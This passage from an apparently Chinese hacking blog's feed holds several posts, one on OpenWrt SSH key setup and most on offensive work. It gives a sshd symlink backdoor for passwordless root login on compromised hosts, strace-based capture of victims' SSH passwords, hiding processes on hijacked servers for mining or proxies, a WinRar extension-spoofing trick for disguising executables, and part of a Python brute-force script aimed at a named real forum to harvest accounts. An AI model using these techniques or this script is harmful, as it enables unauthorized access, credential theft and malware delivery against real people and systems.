sbin]<span class="comment"># chmod u+x sshd</span></div><div class="line">[root<span class="variable">@localhost</span> sbin]<span class="comment"># /etc/init.d/sshd restart</span></div></pre></td></tr></table></figure>

<p>在本机执行：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">socat</span> STDIO TCP4:<span class="number">10.18.180.20:22</span>,sourceport=<span class="number">13377</span></div></pre></td></tr></table></figure>

<p>如果你想修改源端口，可以用python的struct标准库实现</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="input"><span class="prompt">&gt;&gt;&gt;</span> import struct</span></div><div class="line"><span class="input"><span class="prompt">&gt;&gt;&gt;</span> buffer = struct.pack(<span class="string">'&gt;I6'</span>,<span class="number">19526</span>)</span></div><div class="line"><span class="input"><span class="prompt">&gt;&gt;&gt;</span> print repr(buffer)</span></div><div class="line"><span class="input"><span class="prompt">'\x00\x00LF'</span></span></div><div class="line">&gt;&gt;&gt; buffer = struct.pack(<span class="string">'&gt;I6'</span>,<span class="number">13377</span>)</div><div class="line"><span class="input"><span class="prompt">&gt;&gt;&gt;</span> print buffer</span></div><div class="line"><span class="number">4</span>A</div></pre></td></tr></table></figure>

<p><img src="//dn-sqzr.qbox.me/ssh-2.png" alt="效果图"></p>
<hr>
<ul>
<li>记录SSH客户端连接密码<br>搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。 </li>
</ul>
<p><img src="//dn-sqzr.qbox.me/ssh-3.png" alt="效果图"></p>
<hr>
<p>参考链接:<br><a href="http://www.91ri.org/9255.html" target="_blank" rel="external">渗透技巧之SSH篇 - 91ri.org</a>  </p>
]]></content>
    <summary type="html">
    <![CDATA[<p>入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口<br>肉鸡上执行:  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mickey<span class="variable">@vic</span><span class="symbol">:~</span><span class="comment"># ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;</span></div></pre></td></tr></table></figure>

<p>就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。<br>]]>
    
    </summary>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[openwrt 使用密匙登录管理]]></title>
    <link href="https://sqzr.cc//blog/2014/04/21/openwrt-shi-yong-mi-chi-deng-lu-guan-li/"/>
    <id>https://sqzr.cc//blog/2014/04/21/openwrt-shi-yong-mi-chi-deng-lu-guan-li/</id>
    <published>2014-04-21T03:27:00.000Z</published>
    <updated>2014-10-30T12:52:04.000Z</updated>
    <content type="html"><![CDATA[<p>SSH使用密钥登录，不仅安全，而且更方便。sshd在~/.ssh/authorized_keys中加入公钥即可。而OpenWrt使用dropbear作为服务端， ~/.ssh/authorized_keys 并不生效。其实，dropbear的公钥存储文件是600权限的 /etc/dropbear/authorized_keys 文件，只需将公钥加入此文件即可。至于其它，与sshd类似。  </p>
<hr>
<p>首先创建密匙文件,并赋予600权限:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cd</span> /etc/dropbear && <span class="keyword">vi</span> authorized_keys</div><div class="line">chmod <span class="number">0600</span> /etc/dropbear/authorized_keys</div></pre></td></tr></table></figure>

<a id="more"></a>

<p>使用uci查看的当前dropbear配置:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uci <span class="literal">show</span> dropbear</div></pre></td></tr></table></figure>

<p>系统返回:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">dropbear.<span class="property">@dropbear</span>[<span class="number">0</span>]=dropbear</div><div class="line">dropbear.<span class="property">@dropbear</span>[<span class="number">0</span>].RootPasswordAuth=<span class="literal">on</span></div><div class="line">dropbear.<span class="property">@dropbear</span>[<span class="number">0</span>].Port=<span class="number">22</span></div><div class="line">dropbear.<span class="property">@dropbear</span>[<span class="number">0</span>].PasswordAuth=<span class="literal">on</span></div></pre></td></tr></table></figure>

<p>使用uci关闭密码登陆:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">uci</span> set dropbear.<span class="variable">@dropbear</span>[<span class="number">0</span>].PasswordAuth=<span class="built_in">off</span></div><div class="line">uci commit dropbear // 提交修改</div></pre></td></tr></table></figure>

<p>重启服务:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/<span class="keyword">init</span>.d/dropbear restart</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<p>SSH使用密钥登录，不仅安全，而且更方便。sshd在~/.ssh/authorized_keys中加入公钥即可。而OpenWrt使用dropbear作为服务端， ~/.ssh/authorized_keys 并不生效。其实，dropbear的公钥存储文件是600权限的 /etc/dropbear/authorized_keys 文件，只需将公钥加入此文件即可。至于其它，与sshd类似。  </p>
<hr>
<p>首先创建密匙文件,并赋予600权限:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cd</span> /etc/dropbear && <span class="keyword">vi</span> authorized_keys</div><div class="line">chmod <span class="number">0600</span> /etc/dropbear/authorized_keys</div></pre></td></tr></table></figure>

]]>
    
    </summary>
    
      <category term="openwrt" scheme="https://sqzr.cc/categories/openwrt/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CHP.EXE - 隐藏GUI窗口的小程序]]></title>
    <link href="https://sqzr.cc//blog/2014/03/29/chp-dot-exe-yin-cang-guichuang-kou-de-xiao-cheng-xu/"/>
    <id>https://sqzr.cc//blog/2014/03/29/chp-dot-exe-yin-cang-guichuang-kou-de-xiao-cheng-xu/</id>
    <published>2014-03-29T11:24:00.000Z</published>
    <updated>2014-10-30T12:55:14.000Z</updated>
    <content type="html"><![CDATA[<p>不知道大家有没有想我一样的困扰过,提权到一台服务器后,可能拿来<code>挖矿</code>、<code>架设代理服务器</code>,等等的操作。就拿我今天遇到的问题来说吧,想用<a href="https://github.com/clowwindy/shadowsocks" target="_blank" rel="external">shadowsocks</a>来架设一个隧道代理服务器,在尝试过很多代理架设软件后,我选择了这款软件,跨平台强.<strong>windows、linux、mac、android、ios、openwrt</strong>都可以运行他。之前的一篇文章<a href="http://sqzr.cc/blog/2013/11/09/openwrt-shi-xian-socket5dai-li-tou-ming-hua-yi-ji-ke-lu-you/" target="_blank" rel="external">openwrt 实现socket5代理透明化以及可路由</a>正是用到了他。作者比较重点更新node.js版,前几个版本上就加入了<code>udp代理</code>的功能,于是我选择了node.js版,在服务器上装好node.js环境后,在cmd下运行<code>ssserver</code>来启动服务端工作。开始工作的时候,并不能关闭cmd窗口,再网上找了很多办法,让他能在后台隐藏运行,最后发现一个小工具,chp非常好用小巧。<br><a id="more"></a></p>
<hr>
<h2 id="简介">简介</h2>
<p>CHP.EXE是利用Win32 CreateProcess APi 来默默启动一个隐藏窗口的GUI程序以及控制台应用,CHP 是一个免费开源的软件。  </p>
<h2 id="使用说明">使用说明</h2>
<pre><code>CHP yourapp arg1 arg2 arg3 <span class="keyword">...</span>
CHP notepad &lt;-- 在隐藏窗口中运行 notepad.exe
CHP notepad /p <span class="string">"New File.txt"</span> &lt;-- 悄悄的打印一个文本文件
CHP cmd.exe /c <span class="string">""</span>d:\my batch file.cmd<span class="string">" arg1 "</span>arg two<span class="string">""</span> &lt;-- 隐藏的运行一个批处理文件
</code></pre><p>我写好一个bat文件,内容如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">ssserver</span> -m table -k test -p <span class="number">8388</span>  <span class="comment"># 具体参数功能请参考shadowsocks文档</span></div></pre></td></tr></table></figure>

<p>执行命令:<br>    CHP.exe start.bat<br>这样就成功在后台开启了shadowsocks服务,关掉cmd窗口也保持在后台运行。  </p>
<hr>
<p>下载地址:<a href="http://www.commandline.co.uk/chp/chp-0.1.1.13.zip" target="_blank" rel="external">chp-0.1.1.13.zip</a>  </p>
<hr>
<h2 id="参考">参考</h2>
<ul>
<li><a href="http://www.commandline.co.uk/chp/" target="_blank" rel="external">CHP.EXE (Create Hidden Process) - 软件首页</a>  </li>
<li><a href="http://serverfault.com/questions/9038/run-a-bat-file-in-a-scheduled-task-without-a-window" target="_blank" rel="external">command line - Run a .bat file in a scheduled task without a window - 提供了更多的办法</a>  </li>
<li><a href="http://www.commandline.co.uk/cmdow/" target="_blank" rel="external">CMDOW Commandline Window Utility - 一个功能类似的软件,大概看了下,拥有更多的参数</a>  </li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>不知道大家有没有想我一样的困扰过,提权到一台服务器后,可能拿来<code>挖矿</code>、<code>架设代理服务器</code>,等等的操作。就拿我今天遇到的问题来说吧,想用<a href="https://github.com/clowwindy/shadowsocks" target="_blank" rel="external">shadowsocks</a>来架设一个隧道代理服务器,在尝试过很多代理架设软件后,我选择了这款软件,跨平台强.<strong>windows、linux、mac、android、ios、openwrt</strong>都可以运行他。之前的一篇文章<a href="http://sqzr.cc/blog/2013/11/09/openwrt-shi-xian-socket5dai-li-tou-ming-hua-yi-ji-ke-lu-you/" target="_blank" rel="external">openwrt 实现socket5代理透明化以及可路由</a>正是用到了他。作者比较重点更新node.js版,前几个版本上就加入了<code>udp代理</code>的功能,于是我选择了node.js版,在服务器上装好node.js环境后,在cmd下运行<code>ssserver</code>来启动服务端工作。开始工作的时候,并不能关闭cmd窗口,再网上找了很多办法,让他能在后台隐藏运行,最后发现一个小工具,chp非常好用小巧。<br>]]>
    
    </summary>
    
      <category term="神器" scheme="https://sqzr.cc/tags/%E7%A5%9E%E5%99%A8/"/>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WinRar 4.20 – 文件扩展名欺骗(附视频演示)]]></title>
    <link href="https://sqzr.cc//blog/2014/03/28/winrar-4-dot-20-wen-jian-kuo-zhan-ming-qi-pian-fu-shi-pin-yan-shi/"/>
    <id>https://sqzr.cc//blog/2014/03/28/winrar-4-dot-20-wen-jian-kuo-zhan-ming-qi-pian-fu-shi-pin-yan-shi/</id>
    <published>2014-03-28T05:44:00.000Z</published>
    <updated>2014-10-30T12:56:46.000Z</updated>
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2>
<p>WinRar 是常用的压缩与解压缩软件工具。它能将数据压缩成.rar或则.zip格式的包。这篇文章就是给大家呈现Winrar 4.20的一个最新漏洞（0 day）,下面是关于zip文件的相关简要介绍。  </p>
<blockquote>
<p>   Offset<br>   Bytes<br>   Description[25]<br>   00 4 Local file header signature = 0x04034b50 (read as a little-endian number)<br>   04 2 Version needed to extract (minimum)<br>   06 2 General purpose bit flag<br>   08 2 Compression method<br>   10 2 File last modification time<br>   12 2 File last modification date<br>   14 4 CRC-32<br>   18 4 Compressed size<br>   22 4 Uncompressed size<br>   26 2 File name length (n)<br>   28 2 Extra field length (m)<br>   30 n File name<br>   30+n m Extra field</p>
</blockquote>
<p>通过文件格式的描述符中，我们可以看到，偏移30的地址指向压缩文件的名字。当我们尝试用WinRar 4.20将文件压缩为”zip格式”文件时，文件结构看起来没变，但是WinRar添加了一些其独有的文件属性参数。<br>WINRAR添加额外的“文件名”到压缩文件的“文件名”中。进一步的分析表明，第二个“文件名”是文件的真实文件名，当第一个“文件名”出现在WinRar的 GUI窗口时，WinRar会把第一个“文件名”分配给解压后的文件作为文件名。<br>这种行为可以很容易地变成一个非常危险的安全漏洞。<br>假如恶意人员发布一些所谓的txt文本文件，例如“README.TXT”或者PDF格式文件，如“VirusTotal_ScanResults.pdf”，或者更诱人的文件，如“海天盛宴高清图片.  jpg”黑客。受害者会因为放松警惕，而运行恶意程序。<br>相关POC可以参考如下链接:<a href="http://an7isec.blogspot.co.il/2014/03/winrar-file-extension-spoofing-0day.html" target="_blank" rel="external">http://an7isec.blogspot.co.il/2014/03/winrar-file-extension-spoofing-0day.html</a><br><a id="more"></a></p>
<hr>
<h2 id="过程">过程</h2>
<p>首先将一个可执行文件进行压缩:<br><img src="https://dn-sqzr.qbox.me/QQ20140328-1.png" alt="文件压缩"><br>用c32打开,修改ASIN字符串dz.exe,为dz.jpg:<br><img src="https://dn-sqzr.qbox.me/QQ20140328-2.png" alt="c32修改"><br>保存后,尝试打开:<br><img src="https://dn-sqzr.qbox.me/QQ20140328-3.png" alt="打开效果"></p>
<hr>
<h2 id="参考">参考</h2>
<p><a href="http://www.freebuf.com/news/30045.html" target="_blank" rel="external">WinRar 4.20 – 文件扩展名欺骗(0Day) — freebuf</a><br><a href="http://www.exploit-db.com/papers/32480/" target="_blank" rel="external">WinRar 4.20 - File Extension Spoofing (0Day) — exploit-db</a>  </p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="介绍">介绍</h2>
<p>WinRar 是常用的压缩与解压缩软件工具。它能将数据压缩成.rar或则.zip格式的包。这篇文章就是给大家呈现Winrar 4.20的一个最新漏洞（0 day）,下面是关于zip文件的相关简要介绍。  </p>
<blockquote>
<p>   Offset<br>   Bytes<br>   Description[25]<br>   00 4 Local file header signature = 0x04034b50 (read as a little-endian number)<br>   04 2 Version needed to extract (minimum)<br>   06 2 General purpose bit flag<br>   08 2 Compression method<br>   10 2 File last modification time<br>   12 2 File last modification date<br>   14 4 CRC-32<br>   18 4 Compressed size<br>   22 4 Uncompressed size<br>   26 2 File name length (n)<br>   28 2 Extra field length (m)<br>   30 n File name<br>   30+n m Extra field</p>
</blockquote>
<p>通过文件格式的描述符中，我们可以看到，偏移30的地址指向压缩文件的名字。当我们尝试用WinRar 4.20将文件压缩为”zip格式”文件时，文件结构看起来没变，但是WinRar添加了一些其独有的文件属性参数。<br>WINRAR添加额外的“文件名”到压缩文件的“文件名”中。进一步的分析表明，第二个“文件名”是文件的真实文件名，当第一个“文件名”出现在WinRar的 GUI窗口时，WinRar会把第一个“文件名”分配给解压后的文件作为文件名。<br>这种行为可以很容易地变成一个非常危险的安全漏洞。<br>假如恶意人员发布一些所谓的txt文本文件，例如“README.TXT”或者PDF格式文件，如“VirusTotal_ScanResults.pdf”，或者更诱人的文件，如“海天盛宴高清图片.  jpg”黑客。受害者会因为放松警惕，而运行恶意程序。<br>相关POC可以参考如下链接:<a href="http://an7isec.blogspot.co.il/2014/03/winrar-file-extension-spoofing-0day.html" target="_blank" rel="external">http://an7isec.blogspot.co.il/2014/03/winrar-file-extension-spoofing-0day.html</a><br>]]>
    
    </summary>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[西域论坛用户暴力破解脚本(python)]]></title>
    <link href="https://sqzr.cc//blog/2014/03/04/xi-yu-lun-tan-yong-hu-bao-li-po-jie-jiao-ben-python/"/>
    <id>https://sqzr.cc//blog/2014/03/04/xi-yu-lun-tan-yong-hu-bao-li-po-jie-jiao-ben-python/</id>
    <published>2014-03-04T10:18:00.000Z</published>
    <updated>2014-10-30T12:59:57.000Z</updated>
    <content type="html"><![CDATA[<p>好象很多社工库都关闭了,要不抽风,要不收费,要不打不开!!蛋疼,有时候实在想查数据,没地方查。还是自己收集点数据在本地用软件来检索方便。在纠结哪里收集点数据的时候,目测到了一个论坛<a href="http://bbs.xiyv.net" target="_blank" rel="external">西域论坛</a>。一看列表,发现数据还不少,但是很大部分都需要金币,发裤子可以得金币,坑爹,我等小菜哪有什么私藏的裤子啊,哈哈。发现这论坛登陆没验证码,自己写个脚本爆破吧.<br><code>脚本写的非常烂,不考虑性能(其实有用多线程,但线程控制写的很烂,加上论坛有安全狗,只有放慢速度),实际还是可用的</code><br><a id="more"></a><br><img src="https://dn-sqzr.qbox.me/QQ20140304-4.png" alt="爆破图">  </p>
<hr>
<h2 id="需求">需求</h2>
<p>本地环境:python 2.7.3<br>依赖第三方库:<a href="http://www.python-requests.org/en/latest/" target="_blank" rel="external">requests</a>、<a href="http://www.crummy.com/software/BeautifulSoup/" target="_blank" rel="external">BeautifulSoup</a>  </p>
<h2 id="参数">参数</h2>
<blockquote>
<p>   -m —mode     选择模式,数值为1表示进行通过id采集username<br>   -i —uid      需要采集到多少uid，默认为1-3000<br>   -p —password 弱口令密码文件,默认为当前目录的password.txt<br>   -u —username 采集的用户名文件,默认为当前目录的idname.txt<br>   -t —thread   线程数(论坛有狗,不建议开高),默认为2<br>   -o —output   结果输出文件,默认为当前目录的output.txt</p>
</blockquote>
<h2 id="示范:">示范:</h2>
<blockquote>
<p>   python start.py -m 1 -i 1-5000 # 采集1到5000 uid用户的username,采集的结果存在idname.txt<br>   python start.py -m 2           # 进行密码爆破,如果没指定p和u参数,将会去爆破当前目录下的idname.txt里的用户名,使用password.txt里面的密码</p>
</blockquote>
<hr>
<h2 id="代码">代码</h2>
<figure class="highlight python"><figcaption><span>start.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="comment"># website:http://sqzr.cc</span></div><div class="line"><span class="comment"># author:sqzr</span></div><div class="line"><span class="comment"># data:2014-02-09</span></div><div class="line"><span class="keyword">from</span> Queue <span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</div><div class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</div><div class="line"><span class="keyword">from</span> work <span class="keyword">import</span> uid2username,crack_password</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    parser = OptionParser()</div><div class="line">    parser.add_option(<span class="string">'-m'</span>,<span class="string">'--mode'</span>,dest=<span class="string">'mode'</span>,type=<span class="string">'string'</span>,help=<span class="string">'Select Mode'</span>)</div><div class="line">    parser.add_option(<span class="string">'-p'</span>,<span class="string">'--password'</span>,dest=<span class="string">'password'</span>,type=<span class="string">'string'</span>,help=<span class="string">'PasswordFilePath'</span>,default=<span class="string">'password.txt'</span>)</div><div class="line">    parser.add_option(<span class="string">'-u'</span>,<span class="string">'--username'</span>,dest=<span class="string">'username'</span>,type=<span class="string">'string'</span>,help=<span class="string">'IdnameFilePath'</span>,default=<span class="string">'idname.txt'</span>)</div><div class="line">    parser.add_option(<span class="string">'-i'</span>,<span class="string">'--uid'</span>,dest=<span class="string">'uid'</span>,type=<span class="string">'string'</span>,help=<span class="string">'Number'</span>,default=<span class="string">'1-3000'</span>)</div><div class="line">    parser.add_option(<span class="string">'-t'</span>,<span class="string">'--thread'</span>,dest=<span class="string">'thread'</span>,type=<span class="string">'int'</span>,help=<span class="string">'threads'</span>,default=<span class="string">'2'</span>)</div><div class="line">    parser.add_option(<span class="string">'-o'</span>,<span class="string">'--output'</span>,dest=<span class="string">'output'</span>,type=<span class="string">'string'</span>,help=<span class="string">'mode 2 output'</span>,default=<span class="string">'result.txt'</span>)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line"></div><div class="line">    thread = options.thread <span class="comment"># 线程数</span></div><div class="line">    useragent = <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36'</span></div><div class="line"></div><div class="line"><span class="comment">#------------------------------------</span></div><div class="line">    <span class="keyword">if</span> options.mode == <span class="string">'1'</span>:</div><div class="line">        <span class="comment"># 采集id模式</span></div><div class="line">        uid = options.uid.split(<span class="string">'-'</span>)</div><div class="line">        <span class="keyword">if</span> len(uid) &gt; <span class="number">2</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[x] 获取uid数错误,格式:1-3000'</span></div><div class="line">            exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            startuid = int(uid[<span class="number">0</span>])</div><div class="line">            exituid = int(uid[<span class="number">1</span>])</div><div class="line">        <span class="keyword">except</span> ValueError,e:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[x] 请输入正确的uid,格式:1-3000'</span></div><div class="line">            exit(<span class="number">0</span>)</div><div class="line">        <span class="comment"># 生成uid for queue</span></div><div class="line">        uidQueue = Queue()</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(startuid,exituid + <span class="number">1</span>):</div><div class="line">            uidQueue.put(i)</div><div class="line"></div><div class="line">        <span class="comment"># 打开文件</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            usernamefile = open(options.username,<span class="string">'w+'</span>)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[x] 文件读写错误'</span></div><div class="line">            exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">        <span class="comment"># 建立线程锁</span></div><div class="line">        lock = Lock()</div><div class="line"></div><div class="line">        <span class="comment">#启动线程</span></div><div class="line">        threadlist = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(thread):</div><div class="line">            t = uid2username(uidQueue,useragent,usernamefile,lock)</div><div class="line">            threadlist.append(t)</div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">            t.start()</div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">            t.join()</div><div class="line">        <span class="keyword">print</span> <span class="string">'完成,采集到的username已存入%s'</span> % options.username</div><div class="line"></div><div class="line"><span class="comment">#------------------------------------</span></div><div class="line">    <span class="keyword">elif</span> options.mode == <span class="string">'2'</span>:</div><div class="line">        <span class="comment"># 暴力破解模式</span></div><div class="line">        <span class="comment"># 打开username 已经 password文件</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            username_file = open(options.username)</div><div class="line">            password_file = open(options.password)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[x] 打开错误'</span></div><div class="line">            exit(<span class="number">0</span>)</div><div class="line">        <span class="comment"># 生成username for queue</span></div><div class="line">        username_queue = Queue()</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            u_line = username_file.readline()</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> u_line:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            username_queue.put(u_line.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>))</div><div class="line"></div><div class="line">        <span class="comment"># 生成password list</span></div><div class="line">        password_list = password_file.readlines()</div><div class="line">        <span class="comment"># 打开结果文件</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            result_file = open(options.output,<span class="string">'w+'</span>)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[x] 打开错误'</span></div><div class="line">            exit(<span class="number">0</span>)</div><div class="line">        <span class="comment"># 建立线程锁</span></div><div class="line">        lock = Lock()</div><div class="line">        <span class="comment"># 启动线程</span></div><div class="line">        threadlist = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(thread):</div><div class="line">            t = crack_password(username_queue,password_list,lock,result_file,useragent)</div><div class="line">            threadlist.append(t)</div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">            t.start()</div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threadlist:</div><div class="line">            t.join()</div><div class="line">        <span class="keyword">print</span> <span class="string">'完成,爆破成功的用户已存入%s'</span> % options.output</div><div class="line"></div><div class="line"><span class="comment">#------------------------------------</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'[x] 未选择模式'</span></div><div class="line">        exit(<span class="number">0</span>)</div></pre></td></tr></table></figure>

<hr>
<figure class="highlight python"><figcaption><span>work.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="comment"># website:http://sqzr.cc</span></div><div class="line"><span class="comment"># author:sqzr</span></div><div class="line"><span class="comment"># data:2014-02-09</span></div><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get,post</div><div class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</div><div class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit,stdout</div><div class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</div><div class="line"><span class="keyword">from</span> BeautifulSoup <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> linesep,write</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</div><div class="line"><span class="comment"># from Queue import Queue</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">uid2username</span><span class="params">(Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span 